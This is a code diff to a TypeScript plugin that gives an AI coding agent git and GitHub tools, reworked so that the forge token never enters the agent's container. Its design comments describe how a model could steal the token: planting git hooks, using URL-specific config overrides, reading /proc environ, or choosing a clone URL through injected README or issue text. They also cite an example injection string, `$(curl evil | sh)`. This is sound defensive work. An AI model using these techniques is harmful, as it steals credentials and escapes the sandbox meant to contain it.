@@ -13,71 +13,68 @@ import type { AgentPlugin } from "@loopingai/core";
  * two independent — a host with its own container can use this against that
  * instead, and the tests here need no container at all.
  *
- * That seam has already paid for itself once: when the coder's substrate moved
- * from `@cloudflare/sandbox` to `@cloudflare/computer`, not a line of this file
- * changed except this comment.
+ * That seam has already paid for itself twice: when the coder's substrate moved
+ * from `@cloudflare/sandbox` to `@cloudflare/computer`, and again when the
+ * credentialed half of this plugin moved out of the container entirely.
  *
  * ## Where the token lives
  *
- * Nowhere the model or the container can read it, and nowhere it can be sent.
- * Four rules make that true, and all four are load-bearing:
+ * Not in the container. Not for a moment, not in one command, not in one
+ * process's environment. That single sentence replaced four rules and about
+ * three hundred lines, and the history is worth keeping because it is the reason
+ * the sentence is worded so absolutely.
  *
- * 0. **No command carrying the token runs in the checkout.** This is the rule
- *    the other three used to rest on without saying so, and it was false. Git is
- *    itself a general-purpose command runner: it executes whatever
- *    `.git/config` and `.git/hooks` name, and both live in the workspace
- *    filesystem, which outlives the container and which a co-installed shell
- *    tool can write. So a model never needed the token on *its* command — it
- *    planted a `pre-push` hook and waited for `repo_push` to run it, and the
- *    hook read `$REPO_TOKEN` out of the environment it inherited. Demonstrated
- *    against real git, not theorised.
+ * **What went wrong.** Git is itself a general-purpose command runner: it
+ * executes whatever `.git/config` and `.git/hooks` name, and both live in the
+ * workspace filesystem, which outlives the container and which a co-installed
+ * shell tool can write. So a model never needed the token on *its* command — it
+ * planted a `pre-push` hook and waited for `repo_push` to run it, and the hook
+ * read `$REPO_TOKEN` out of the environment it inherited. Demonstrated against
+ * real git, not theorised.
  *
- *    Nothing survived that could be patched key by key, either: `-c` loses to a
- *    URL-specific `http.<url>.sslVerify=false` in the repository's own config,
- *    because specificity outranks precedence. So the credential-bearing
- *    commands moved out of the checkout entirely, into a bare git dir created
- *    per operation whose whole config is what we write on the command line and
- *    into the dir itself — see {@link cleanConfig}. The checkout's objects are
- *    reached through an alternates file, so nothing is copied and nothing is
- *    slower.
+ * **What was tried.** Patching that key by key does not work: `-c` loses to a
+ * URL-specific `http.<url>.sslVerify=false` in the repository's own config,
+ * because specificity outranks precedence. So credentialed commands moved into a
+ * bare git dir created per operation, built, configured and used inside one
+ * shell command, reaching the checkout's objects through an alternates file. It
+ * worked. It also left a residual nobody could close from inside the container:
+ * for the length of one command the token sat in a process's environment on a
+ * filesystem the model had root on, and `/proc/<pid>/environ` needs no git at
+ * all.
  *
- *    That dir is built, configured and used inside **one** command. Splitting
- *    those steps left a window: the model has a root shell on the same
- *    filesystem, so between creating the dir and using it, a `config` could be
- *    planted in it — and a URL-specific `http.<url>.proxy` there beats a `-c`
- *    override for the same specificity reason. So the credentialed command
- *    writes the dir's entire configuration itself, immediately before git reads
- *    it, rather than trusting what it finds.
- * 1. **The token never appears in a command string.** It goes through `exec`'s
- *    per-command `env`, because a command line is echoed into stdout, into
- *    stderr on failure, into shell history, and into any VCR cassette a test
- *    records. `git` reads it back out of the environment through a credential
- *    helper that prints and exits.
- * 2. **The credential helper is scoped to the forge, and the forge is an
- *    allowlist.** This is the rule that is easy to miss and expensive to get
- *    wrong. A helper configured as plain `credential.helper` answers for *every
- *    host* — it never sees which one git is asking about — so a clone URL
- *    pointing anywhere makes git offer the token to that host the moment it
- *    replies `401`. And the clone URL is model input: a repository README, an
- *    issue body, or a page fetched by a co-installed browser plugin is enough to
- *    choose it. So the helper is bound to `credential.<origin>.helper`, and the
- *    URL's host must be on {@link RepoConfig.allowedHosts} before anything runs.
- * 3. **Pull requests are opened from the Worker, not the container.** The GitHub
- *    REST call happens on this side of the boundary, so the container never
- *    holds a credential that can act on the repository at all.
+ * **What is true now.** The three operations that need a credential — clone,
+ * fetch, push — are not run here. They go to {@link RepoConfig.git}, which the
+ * host implements on its own side of the boundary, and the container never sees
+ * them. The coder in `looping-starter` runs isomorphic-git inside the Durable
+ * Object that owns the workspace filesystem: same files, no shell, no hooks, no
+ * `ext::` transport, no template directory, no credential helpers. There is
+ * nothing to plant and no environment to read.
  *
- * The remaining exposure is deliberate and small: `git push` needs the token in
- * the container's process environment for the duration of one command, scoped to
- * one origin, in a git dir that has no hooks and no configuration of its own.
+ * Everything else — `status`, `diff`, `add`, `commit`, `checkout` — still runs
+ * in the container through {@link RepoConfig.exec}, because none of it needs to
+ * authenticate. That is the whole split, and it is the one thing to preserve
+ * when changing this file: if an operation talks to the forge it does not belong
+ * on `exec`, and if it does not, it has no business anywhere else.
  *
- * It is not zero, and the residual is worth naming precisely rather than waving
- * at. Rule 0 removes the durable form of the attack — plant once in the
- * checkout, collect on every future push — and folding each operation into a
- * single command removes the window between building the isolated dir and using
- * it. What is left is a race *inside* one command, against a path named from the
- * Worker that the attacker has to discover first. The complete fix is to stop
- * doing authenticated git in the container at all, which means pushing from the
- * Worker over the forge's API; that is a larger change than this file.
+ * Two rules survive the move, because they were never about the container:
+ *
+ * 1. **The forge is an allowlist, checked before anything runs.** A clone URL is
+ *    model input — a repository README, an issue body, or a page fetched by a
+ *    co-installed browser plugin is enough to choose it — and a credential
+ *    offered to a host of the model's choosing is the whole game. So the URL's
+ *    host must be on {@link RepoConfig.allowedHosts} before any operation
+ *    starts, and the allowlist travels with each call so the host can bind the
+ *    check to the moment the token would actually be handed over. `origin` is
+ *    re-derived and re-checked on every push rather than remembered, because the
+ *    checkout's `.git/config` is a file the container can rewrite.
+ * 2. **Pull requests are opened from the Worker.** The REST call happens on this
+ *    side, so the credential that can write to the repository through the API
+ *    never crosses the boundary either.
+ *
+ * Model-authored values — URLs, branch names, commit messages — still travel to
+ * the container as environment variables rather than being interpolated into a
+ * command, so a branch name of `$(curl evil | sh)` is inert text. That is about
+ * shell injection, not credentials, and it is unaffected by any of the above.
  *
  * A separate limit, and not one this plugin can close: the allowlist bounds the
  * *host*, never the repository. Whatever the token can reach, an agent talked
@@ -114,9 +111,84 @@ export type RepoExec = (
   exitCode: number;
 }>;
 
+/**
+ * The three git operations that need the forge token, run by the host.
+ *
+ * Injected for the same reason {@link RepoExec} is — this plugin owns the
+ * policy, not the plumbing — but the split between the two is not arbitrary. It
+ * is the trust boundary. Everything reachable through `exec` runs in the
+ * container and gets **no credential**; everything here runs wherever the host
+ * keeps its secret and never touches the container at all.
+ *
+ * That is why `clone`, `fetch` and `push` are the whole interface. They are
+ * exactly the operations that talk to the forge. `status`, `diff`, `add`,
+ * `commit` and `checkout` are local, need nothing to authenticate with, and stay
+ * on `exec` where they are cheap and where the model can see them work.
+ *
+ * A host implements this against whatever git it has on its own side of the
+ * boundary. The coder in `looping-starter` runs isomorphic-git inside the
+ * Durable Object that owns the workspace filesystem, so a push reads the token
+ * from that object's environment and the container never holds one.
+ *
+ * ## Failures arrive as values
+ *
+ * No method here rejects for a git failure. A remote that refuses a push, a
+ * branch that does not resolve, a repository that is not there — all of it comes
+ * back as `ok: false`, because those are answers. A rejection means the host
+ * itself could not be reached, which is a different fact and gets a different
+ * sentence from every tool in this file. See {@link RunResult}.
+ */
+export interface RepoGit {
+  /**
+   * Put a checkout at `dir`, on `branch` or the remote's default.
+   *
+   * `detail` is the branch it landed on — the caller cannot know it in advance
+   * when `branch` is omitted, and asking git afterwards would be a second round
+   * trip for something the clone already had in its hand.
+   */
+  clone(req: {
+    url: string;
+    dir: string;
+    allowedHosts: string[];
+    branch?: string;
+    depth?: number;
+  }): Promise<RepoGitResult>;
+  /** Update remote-tracking refs for the checkout at `dir`. */
+  fetch(req: {
+    url: string;
+    dir: string;
+    allowedHosts: string[];
+    depth?: number;
+  }): Promise<RepoGitResult>;
+  /**
+   * Push `branch` to the same-named branch on the remote.
+   *
+   * Never a force push and never a refspec: the caller has already refused
+   * anything that is not a plain branch name, and this signature is the other
+   * half of that promise — there is no parameter here with which to ask for one.
+   */
+  push(req: {
+    url: string;
+    dir: string;
+    branch: string;
+    allowedHosts: string[];
+  }): Promise<RepoGitResult>;
+}
+
+/** What a {@link RepoGit} operation reports. */
+export type RepoGitResult =
+  { ok: true; detail: string } | { ok: false; code?: string; message: string };
+
 export interface RepoConfig {
-  /** Runs commands in the container holding the checkout. */
+  /**
+   * Runs commands in the container holding the checkout.
+   *
+   * Uncredentialed, always. Nothing this runs is ever given the forge token —
+   * see {@link RepoGit} for the operations that need one.
+   */
   exec: RepoExec;
+  /** Runs the three credentialed operations, on the host's side of the boundary. */
+  git: RepoGit;
   /**
    * A forge token with contents+pull-request write. A thunk so a rotated secret
    * is picked up without rebuilding the plugin list.
@@ -261,83 +333,6 @@ export function truncateOutput(text: string, max: number): string {
   );
 }
 
-/**
- * A credential helper that prints the token from the environment and exits.
- *
- * This is what keeps the secret off the command line. `git` invokes the helper,
- * the helper reads `$REPO_TOKEN` out of its own environment, and the token never
- * becomes an argument that something could log. The alternative everyone reaches
- * for first — embedding it in the remote URL — writes it into `.git/config`,
- * where it stays after the command finishes.
- *
- * Note what the helper does **not** do: read git's stdin, where the protocol
- * says which host is being asked about. It answers unconditionally, so it must
- * never be installed unconditionally — see {@link credentialConfig}.
- */
-const CREDENTIAL_HELPER =
-  "!f() { echo username=x-access-token; echo password=$REPO_TOKEN; }; f";
-
-/**
- * Bind the helper to one origin.
- *
- * `credential.helper` applies to every host git ever authenticates to; with a
- * helper that ignores its input, that means the token is offered to any server
- * that asks for auth. `credential.<origin>.helper` applies only to URLs under
- * that origin, so a clone pointed elsewhere gets no credential at all — the
- * request fails instead of leaking.
- *
- * Verified against real git: with the unscoped form,
- * `git credential fill` for `host=evil.example.com` printed the token.
- */
-function credentialConfig(host: string): string {
-  return `credential.https://${host}.helper='${CREDENTIAL_HELPER}'`;
-}
-
-/**
- * Everything a credential-bearing git command is configured by — all of it, and
- * none of it from a file.
- *
- * On the command line rather than in a config file we write, because the command
- * line is the one channel the container cannot rewrite underneath us: it arrives
- * in the same syscall as the command. A file we plant can be edited in the gap
- * between the command that writes it and the command that reads it.
- *
- * - `core.hooksPath` is pointed at nothing, so no hook runs. This is the vector
- *   the clean dir exists for, and the belt to its braces: the dir is fresh, so
- *   it has no hooks either.
- * - `init.templateDir` is emptied, so a hook planted in the image's template
- *   directory is not copied into any `.git/hooks` we create.
- * - `credential.helper=` **resets the list**, and must come before ours is
- *   added. A helper already in the chain answers first, and a helper is a shell
- *   command git runs with this environment — which is to say, with the token.
- */
-function cleanConfig(host: string): string {
-  return [
-    "-c core.hooksPath=/dev/null",
-    "-c init.templateDir=",
-    "-c credential.helper=",
-    `-c ${credentialConfig(host)}`
-  ].join(" ");
-}
-
-/**
- * The environment of a credential-bearing command, beyond the token itself.
- *
- * `GIT_ASKPASS` names a program that fails rather than being left unset: unset,
- * a `core.askPass` from somebody else's config is used instead, and it is run
- * with this environment. The `GIT_CONFIG_*` pair takes the global and system
- * files out of play — there is no equivalent for a repository's own config,
- * which is the whole reason these commands do not run in one.
- */
-const CREDENTIALED_ENV: Record<string, string> = {
-  // A credential miss must fail, not block forever on a prompt nobody is there
-  // to answer. A hang is worse than an error: it burns the round.
-  GIT_TERMINAL_PROMPT: "0",
-  GIT_ASKPASS: "/bin/false",
-  GIT_CONFIG_GLOBAL: "/dev/null",
-  GIT_CONFIG_SYSTEM: "/dev/null"
-};
-
 /** Branch names a push must never target, whatever the model believes. */
 const PROTECTED_BRANCHES = new Set(["main", "master", "trunk", "develop"]);
 
@@ -468,8 +463,8 @@ function unreachableNote(err: unknown): string {
       "you asked for. The checkout is durable and is exactly as you left it. " +
       "Retry, and read what the retry says rather than assuming it starts from " +
       "nothing: a command that had already reached the forge may have taken " +
-      "effect. Retrying is safe either way — these commands push one specific " +
-      "commit and never force."
+      "effect. Retrying is safe either way — these commands push one branch to " +
+      "the branch of the same name, and never force."
     );
   }
   return (
@@ -504,15 +499,14 @@ interface GitRunners {
   /**
    * The whole credential-bearing half, as one call rather than a runner.
    *
-   * `refreshCheckout` used to be handed the credentialed runner itself and
-   * pointed it at the checkout. It cannot be any more — the token only ever
-   * enters a git dir this module made — so what it borrows now is the finished
-   * operation.
+   * `refreshCheckout` used to be handed a credentialed runner and pointed it at
+   * the checkout. It cannot be, and the reason is the point of this whole file:
+   * a credential never goes anywhere near the container. What it borrows now is
+   * the finished operation, which happens somewhere else entirely.
    */
   fetchOrigin: (
     dir: string,
-    url: string,
-    host: string
+    url: string
   ) => Promise<{ success: boolean; stdout: string; stderr: string }>;
 }
 
@@ -534,14 +528,12 @@ async function refreshCheckout({
   dir,
   url,
   branch,
-  host,
   plain,
   fetchOrigin
 }: GitRunners & {
   dir: string;
   url: string;
   branch: string | undefined;
-  host: string;
 }): Promise<RefreshOutcome> {
   const remote = await plain("remote get-url origin", dir);
   // Interrogated, for the same reason the `status` below is: a question that went
@@ -596,7 +588,7 @@ async function refreshCheckout({
     };
   }
 
-  const fetched = await fetchOrigin(dir, url, host);
+  const fetched = await fetchOrigin(dir, url);
   if (!fetched.success)
     return { message: `fetch failed: ${fetched.stderr || fetched.stdout}` };
 
@@ -799,35 +791,6 @@ export function buildRepoTools(
       }
     });
 
-  const credentialed = (
-    host: string,
-    args: string,
-    cwd: string,
-    vars: Record<string, string> = {},
-    /**
-     * Shell run in the *same* command, immediately before the git invocation.
-     *
-     * This is how the isolated dir gets built and its configuration re-asserted
-     * with no gap for anything to be planted in between. Everything a caller
-     * puts here must be a plain file operation or a git command against the room
-     * — never git inside the checkout, which is the one place the token must not
-     * reach. Chained with `&&`, so a failure stops before the credential is used.
-     */
-    prelude?: string
-  ) =>
-    run(
-      `${prelude ? `${prelude} && ` : ""}git ${cleanConfig(host)} ${args}`,
-      () => ({
-        cwd,
-        runtime,
-        env: {
-          REPO_TOKEN: config.token(),
-          ...CREDENTIALED_ENV,
-          ...vars
-        }
-      })
-    );
-
   /** A container command with no secret in its environment. */
   const shell = (
     script: string,
@@ -847,232 +810,138 @@ export function buildRepoTools(
   ) => shell(`git ${args}`, cwd, vars);
 
   /**
-   * Create a git dir the model has never had the chance to configure.
+   * Run one credentialed operation, on the host's side of the boundary.
    *
-   * Named from the Worker rather than by `mktemp`, for two reasons. The path is
-   * then unguessable *and* it is not something the container told us — a path
-   * read back from a command's stdout is model-controlled, and this one is later
-   * handed to `rm -rf`.
+   * The sibling of {@link run}, and it exists for the same reason: every tool
+   * below already has a `!success` branch that says what it was doing at the
+   * time, and that is a better sentence than any wrapper could write. What
+   * differs is where a failure can come from.
+   *
+   * {@link RepoGit} reports a *git* failure as data — a rejected push, a branch
+   * that does not resolve — so that becomes an ordinary unsuccessful result. A
+   * throw means the host could not be reached at all, which is the `unreachable`
+   * case: nothing ran, and three places in this file read that differently from
+   * an answer.
+   *
+   * Serialised with the container commands rather than merely alongside them. A
+   * fetch writes refs into the same checkout a `git status` is reading, and the
+   * two interleaving is exactly the race `serialised` exists to prevent — the
+   * fact that one of them now runs somewhere else does not change that they
+   * share a filesystem.
    */
-  const CREATE_ROOM = [
-    'rm -rf "$GIT_ROOM"',
-    'git -c init.templateDir= init -q --bare "$GIT_ROOM"'
-  ].join(" && ");
+  const runGit = (op: () => Promise<RepoGitResult>): Promise<RunResult> =>
+    serialised(async () => {
+      try {
+        const result = await op();
+        return result.ok
+          ? { success: true, stdout: result.detail, stderr: "", exitCode: 0 }
+          : { success: false, stdout: "", stderr: result.message, exitCode: 1 };
+      } catch (err) {
+        // Logged here as well as by the tool's own failure branch, the same way
+        // `run` does it: this is the line that names the operation as git's
+        // rather than the container's, which is the first thing worth knowing.
+        console.warn("[repo] a credentialed git operation could not run", {
+          err: String(err)
+        });
+        return {
+          success: false,
+          stdout: "",
+          stderr: unreachableNote(err),
+          exitCode: -1,
+          unreachable: true
+        };
+      }
+    });
 
   /**
-   * Write the room's entire on-disk configuration, in the same command that is
-   * about to read it.
+   * Update the checkout's remote-tracking refs.
    *
-   * This is what closes the window creating it left open. The model has a root
-   * shell on the same filesystem, so between the command that made the room and
-   * the command that uses it there was a gap in which `$GIT_ROOM/config` could
-   * be given an `http.<url>.proxy` and an `sslVerify=false` — and a URL-specific
-   * key in a repository's own config beats a `-c` override, which is the whole
-   * reason the room exists. Rewriting the file rather than trusting it means the
-   * attacker has to win a race *inside* one process instead of between two.
-   *
-   * The three files are every channel that survives into a credentialed command:
-   * `config`, the alternates that decide which objects are reachable, and
-   * `shallow`. Hooks are the fourth and are dealt with on the command line by
-   * {@link cleanConfig}, which no file can override.
-   *
-   * `bare = true` and format 0 are what `git init --bare` itself writes, and we
-   * created this dir two steps ago, so restating them is exact rather than a
-   * guess.
-   *
-   * The alternates arrive as a **file** rather than through
-   * `GIT_ALTERNATE_OBJECT_DIRECTORIES`. That is not a style choice: a refresh
-   * ends with the checkout fetching *from* this dir, which spawns an
-   * `upload-pack` inside it that does not inherit our environment. With the
-   * variable and not the file, that fetch dies on `bad pack header`.
-   *
-   * `shallow` is copied when it exists, and it is load-bearing for `depth`:
-   * without it the room believes it has history it does not have, builds a pack
-   * on that belief, and the push is rejected with `unpacker error`.
-   *
-   * Note what this does *not* do: run git inside the checkout. Every line is a
-   * plain file operation on a path, which is what makes it safe to put in the
-   * same command as the token.
+   * The allowlist travels with the call rather than being checked once here,
+   * because the host is where the token actually is: it can bind the check to
+   * the moment the credential would be handed over, which catches a host reached
+   * by redirect as well as one named in the URL.
    */
-  const ASSERT_ROOM = [
-    `printf '[core]\\n\\trepositoryformatversion = 0\\n\\tbare = true\\n' > "$GIT_ROOM/config"`,
-    `printf '%s\\n' "$REPO_DIR/.git/objects" > "$GIT_ROOM/objects/info/alternates"`,
-    '{ [ ! -f "$REPO_DIR/.git/shallow" ] || cp "$REPO_DIR/.git/shallow" "$GIT_ROOM/shallow"; }'
-  ].join(" && ");
+  const fetchOrigin = (dir: string, url: string) =>
+    runGit(() => config.git.fetch({ url, dir, allowedHosts }));
+
+  /** Push one branch to the same-named branch on the remote. Never forced. */
+  const pushBranch = (dir: string, url: string, branch: string) =>
+    runGit(() => config.git.push({ url, dir, branch, allowedHosts }));
 
   /**
-   * Which step a chained script reached, so a failure still names itself.
+   * One call to the forge's API, from the Worker.
    *
-   * Folding the steps into one command costs the thing separate commands gave
-   * for free: a return value per step. A marker per stage buys it back, and it
-   * goes to stdout because the message a caller renders reads `stderr` first —
-   * so on the failing path git's own diagnostic still wins and these stay out of
-   * it.
+   * Shares `repo_open_pr`'s shape — same bound, same header set, same refusal to
+   * let an unreadable body replace the status that explains a failure — but not
+   * its wording. That tool is a POST that may have been received even when the
+   * answer never arrived, so it has to say something these do not, and copying
+   * its sentence here would be wrong in three places to save duplication in one.
    */
-  const stage = (name: string) => `echo "[stage:${name}]"`;
-
-  const lastStage = (out: string): string | undefined =>
-    [...out.matchAll(/\[stage:(\w+)\]/g)].pop()?.[1];
-
-  /**
-   * Turn a failed room script into a sentence that says where it stopped.
-   *
-   * A success passes through untouched — the stage markers are diagnostics for
-   * the path that failed, and rewriting `stderr` on a command that worked would
-   * put a sentence about failure into a result that had none.
-   *
-   * `run` means the setup finished and git itself failed, which is the ordinary
-   * case: the caller wants git's own message, not ours.
-   */
-  const roomFailure = <
-    T extends {
-      success: boolean;
-      stdout: string;
-      stderr: string;
-      unreachable?: true;
+  const forge = async (
+    tool: string,
+    path: string,
+    init?: { method: string; body: unknown }
+  ): Promise<{ ok: true; data: unknown } | { ok: false; message: string }> => {
+    let response: Response;
+    try {
+      response = await fetch(`${apiBase}${path}`, {
+        method: init?.method ?? "GET",
+        headers: {
+          authorization: `Bearer ${config.token()}`,
+          accept: "application/vnd.github+json",
+          "content-type": "application/json",
+          "user-agent": "looping-coder"
+        },
+        ...(init ? { body: JSON.stringify(init.body) } : {}),
+        signal: AbortSignal.timeout(PR_TIMEOUT_MS)
+      });
+    } catch (err) {
+      logFailure(tool, { stderr: String(err) });
+      return {
+        ok: false,
+        message: `could not reach ${apiBase}: ${String(err)}`
+      };
     }
-  >(
-    result: T
-  ): T => {
-    if (result.success) return result;
-    // A command that never ran stopped at no stage at all. "stopped at start"
-    // would be true only in the sense that nothing happened, and it would point
-    // at the room script for something the container did.
-    if (result.unreachable) return result;
-    const stopped = lastStage(result.stdout);
-    if (stopped === "run") return result;
+    if (!response.ok) {
+      const detail = await response.text().catch(() => "");
+      logFailure(tool, { exitCode: response.status, stderr: detail });
+      return {
+        ok: false,
+        message: `${apiBase}${path} answered ${response.status}: ${detail.slice(0, 500)}`
+      };
+    }
+    return { ok: true, data: await response.json().catch(() => ({})) };
+  };
+
+  /**
+   * Which repository the tools that read the forge are talking about.
+   *
+   * The checkout's own origin, never a URL the model supplies. Three reasons, in
+   * order of how much they matter: the origin has already been through the host
+   * allowlist, there is nothing new to validate; a model that can name any
+   * repository here can read any repository the token can, which is precisely
+   * the reach this plugin does not want to widen; and an agent asking about
+   * "issue 42" almost always means the repository it is working in, so the extra
+   * parameter would mostly be an extra way to be wrong.
+   */
+  const forgeRepo = async (
+    dir: string
+  ): Promise<{ owner: string; repo: string } | { refusal: string }> => {
+    const { remote, unreachable } = await origin(dir);
+    if (unreachable) return { refusal: bounded(unreachable) };
+    if (!remote)
+      return {
+        refusal: `${dir} has no origin on an allowed host — clone it with repo_clone first`
+      };
+    const parsed = parseRepo(remote.url, allowedHosts);
+    if (!parsed)
+      return {
+        refusal: `could not parse an owner/repo out of ${dir}'s origin`
+      };
     return {
-      ...result,
-      stderr:
-        `could not prepare an isolated git dir (stopped at ${stopped ?? "start"}): ` +
-        `${result.stderr || result.stdout}`
+      owner: encodeURIComponent(parsed.owner),
+      repo: encodeURIComponent(parsed.repo)
     };
-  };
-
-  const closeCleanRoom = (room: string) =>
-    shell('rm -rf "$GIT_ROOM"', workdir, { GIT_ROOM: room });
-
-  const cleanRoomPath = () => `/tmp/looping-repo-${crypto.randomUUID()}.git`;
-
-  /**
-   * Fetch `origin` without any of the checkout's configuration applying.
-   *
-   * Three commands, and only the middle one holds the token. The split is not
-   * cosmetic: the first has to run `git` **inside the checkout** to read its
-   * refs, and a git command in the checkout is precisely what must never carry
-   * the credential — that repository's config and hooks are model-writable, and
-   * git executes what they name. So the seed goes in its own command with no
-   * token, and the credentialed fetch re-asserts the room's own configuration
-   * before using it rather than trusting what it finds.
-   *
-   * 1. build the room and seed it with the checkout's refs, so the fetch has a
-   *    negotiation base. Skip it and git has nothing to say it already has, and
-   *    re-downloads the entire history on every refresh.
-   * 2. re-assert the room's config, then fetch from the forge into it.
-   * 3. move the updated remote refs into the checkout, over the local
-   *    transport, with no credential anywhere near it.
-   */
-  const fetchOrigin = async (dir: string, url: string, host: string) => {
-    const room = cleanRoomPath();
-
-    const prepared = await shell(
-      [
-        stage("create"),
-        CREATE_ROOM,
-        // The alternates have to exist *before* the seed, not only before the
-        // fetch. `update-ref` refuses a ref whose object it cannot reach, so
-        // without them every ref fails with "nonexistent object", the seed
-        // quietly does nothing, and the fetch that follows re-downloads the
-        // whole history — the exact cost the seed exists to avoid, and silent
-        // because the seed is best-effort.
-        stage("assert"),
-        ASSERT_ROOM,
-        stage("seed"),
-        // Best effort: a failure here costs a full history download, not
-        // correctness, and a repository with no refs to seed is a fresh one.
-        // Wrapped so it cannot fail the chain — `pipefail` would otherwise make
-        // an empty ref list stop everything.
-        '{ git -C "$REPO_DIR" for-each-ref --format="update %(refname) %(objectname)"' +
-          ' | git --git-dir="$GIT_ROOM" update-ref --stdin || true; }'
-      ].join(" && "),
-      workdir,
-      { GIT_ROOM: room, REPO_DIR: dir }
-    );
-    if (!prepared.success) return roomFailure(prepared);
-
-    try {
-      const fetched = await credentialed(
-        host,
-        `--git-dir="$GIT_ROOM" fetch --prune "$REPO_URL" "+refs/heads/*:refs/remotes/origin/*"`,
-        workdir,
-        { GIT_ROOM: room, REPO_DIR: dir, REPO_URL: url },
-        [stage("assert"), ASSERT_ROOM, stage("run")].join(" && ")
-      );
-      if (!fetched.success) return roomFailure(fetched);
-
-      return await shell(
-        'git -C "$REPO_DIR" fetch --prune "$GIT_ROOM" "+refs/remotes/origin/*:refs/remotes/origin/*"',
-        workdir,
-        { REPO_DIR: dir, GIT_ROOM: room }
-      );
-    } finally {
-      await closeCleanRoom(room);
-    }
-  };
-
-  /**
-   * Push one branch, by the commit it points at, from a clean dir.
-   *
-   * The sha is resolved in the checkout beforehand and the ref is written into
-   * the clean dir by hand, because the alternative — letting the credentialed
-   * git read the checkout to find out what to push — is the thing this whole
-   * arrangement exists to avoid.
-   */
-  const pushBranch = async (
-    dir: string,
-    url: string,
-    host: string,
-    branch: string,
-    sha: string
-  ) => {
-    const room = cleanRoomPath();
-    try {
-      // One command, start to finish, and the push is the only part that needed
-      // splitting up before. Nothing here runs git inside the checkout — the
-      // room is created in /tmp, its files are written with `printf` and `cp`,
-      // and the ref is staged from a sha the caller already resolved. So the
-      // token can be present throughout without ever entering a repository
-      // whose config and hooks the model can write, and there is no window
-      // between building the room and using it for anything to be planted in.
-      //
-      // No leading `+` on the refspec, so this stays a non-force push — the same
-      // guarantee the old `push origin <branch>` gave, now stated outright.
-      return roomFailure(
-        await credentialed(
-          host,
-          `--git-dir="$GIT_ROOM" push "$REPO_URL" "refs/heads/$REPO_BRANCH:refs/heads/$REPO_BRANCH"`,
-          workdir,
-          {
-            GIT_ROOM: room,
-            REPO_DIR: dir,
-            REPO_URL: url,
-            REPO_BRANCH: branch,
-            REPO_SHA: sha
-          },
-          [
-            stage("create"),
-            CREATE_ROOM,
-            stage("assert"),
-            ASSERT_ROOM,
-            stage("stage"),
-            'git --git-dir="$GIT_ROOM" update-ref "refs/heads/$REPO_BRANCH" "$REPO_SHA"',
-            stage("run")
-          ].join(" && ")
-        )
-      );
-    } finally {
-      await closeCleanRoom(room);
-    }
   };
 
   /**
@@ -1206,7 +1075,6 @@ export function buildRepoTools(
             dir,
             url,
             branch,
-            host,
             plain,
             fetchOrigin
           });
@@ -1223,26 +1091,17 @@ export function buildRepoTools(
           return refreshed.message;
         }
 
-        // `depth` is a number from the schema, so it cannot carry shell syntax.
-        const flags = [
-          depth ? `--depth ${Math.max(1, Math.floor(depth))}` : "",
-          branch ? `--branch "$REPO_BRANCH"` : ""
-        ]
-          .filter(Boolean)
-          .join(" ");
-        // The one credentialed command that needs no clean dir of its own: the
-        // target does not exist yet, so there is no config to inherit and git
-        // writes the new repository's own. It still carries `cleanConfig`, for
-        // the hooks a template directory would otherwise install into it.
-        const result = await credentialed(
-          host,
-          `clone ${flags} "$REPO_URL" "$REPO_DIR"`,
-          workdir,
-          {
-            REPO_URL: url,
-            REPO_DIR: dir,
-            ...(branch ? { REPO_BRANCH: branch } : {})
-          }
+        // `depth` is bounded here rather than trusted from the schema. It no
+        // longer reaches a shell, so this is arithmetic rather than quoting: a
+        // fractional or negative depth is not something to hand to git.
+        const result = await runGit(() =>
+          config.git.clone({
+            url,
+            dir,
+            allowedHosts,
+            ...(branch ? { branch } : {}),
+            ...(depth ? { depth: Math.max(1, Math.floor(depth)) } : {})
+          })
         );
         if (!result.success) {
           logFailure("repo_clone", result);
@@ -1251,6 +1110,10 @@ export function buildRepoTools(
 
         // Identity has to exist before the first commit, and a repo-local config
         // keeps it from leaking into anything else in the container.
+        //
+        // Still written through the container, and deliberately: the commits it
+        // names are made there, by `repo_commit`, with no credential in sight.
+        // Only the three operations that talk to the forge moved.
         await plain(`config user.name "$GIT_NAME"`, dir, {
           GIT_NAME: author.name
         });
@@ -1258,17 +1121,34 @@ export function buildRepoTools(
           GIT_EMAIL: author.email
         });
 
-        // Falls back to what was asked for rather than reporting an empty name.
-        // A failed `rev-parse` used to produce "on branch " and fire
-        // `afterCheckout` with no branch at all, which starts an install against
-        // a checkout nobody can name.
-        const head = await plain("rev-parse --abbrev-ref HEAD", dir);
-        const landed = head.stdout.trim() || branch;
+        // Two gits now share one `.git`, and this is where they could disagree.
+        //
+        // The container's git and the host's isomorphic-git read and write the
+        // same index. isomorphic-git understands version 2 and the extensions
+        // git writes for its own caches are not part of that contract, so a
+        // repository that picked up an untracked cache or a split index — from a
+        // `feature.manyFiles` default, or a user config in some future image —
+        // would be written by one and misread by the other. Pinned at clone
+        // time, repo-locally, where it costs three commands and cannot surprise
+        // anyone later.
+        //
+        // Unchecked deliberately, like the upstream-tracking pair in
+        // `repo_push`: git's own defaults are already these values, so a failure
+        // here means the config could not be written at all, which the very next
+        // command will say far more clearly than this one could.
+        await plain(`config index.version 2`, dir);
+        await plain(`config core.untrackedCache false`, dir);
+        await plain(`config core.splitIndex false`, dir);
+
+        // The clone reports the branch it landed on, so nothing has to ask git
+        // afterwards. That used to be a `rev-parse --abbrev-ref HEAD` whose
+        // failure produced "on branch " and fired `afterCheckout` with no branch
+        // at all, starting an install against a checkout nobody could name.
+        const landed = result.stdout.trim() || branch;
         if (!landed) {
-          logFailure("repo_clone", head);
+          logFailure("repo_clone", result);
           return bounded(
-            `cloned to ${dir}, but could not read which branch it landed on: ` +
-              `${head.stderr || head.stdout || "git rev-parse failed"}`
+            `cloned to ${dir}, but could not read which branch it landed on`
           );
         }
         await notifyCheckout({
@@ -1494,13 +1374,7 @@ export function buildRepoTools(
           );
         }
 
-        const result = await pushBranch(
-          dir,
-          remote.url,
-          remote.host,
-          branch,
-          tip.stdout.trim()
-        );
+        const result = await pushBranch(dir, remote.url, branch);
         if (!result.success) {
           logFailure("repo_push", result);
           return bounded(`push failed: ${result.stderr || result.stdout}`);
@@ -1620,6 +1494,163 @@ export function buildRepoTools(
         return (
           pr.html_url ?? "pull request opened, but the response carried no URL"
         );
+      }
+    }),
+
+    repo_issue_view: tool({
+      description:
+        "Read an issue or pull request from the repository you have checked out: its title, state, description and comments. Use this when a task refers to an issue number, before guessing what it asks for.",
+      inputSchema: z.object({
+        dir: z.string().describe("The checkout directory"),
+        number: z.number().int().positive().describe("Issue or PR number")
+      }),
+      execute: async ({ dir, number }) => {
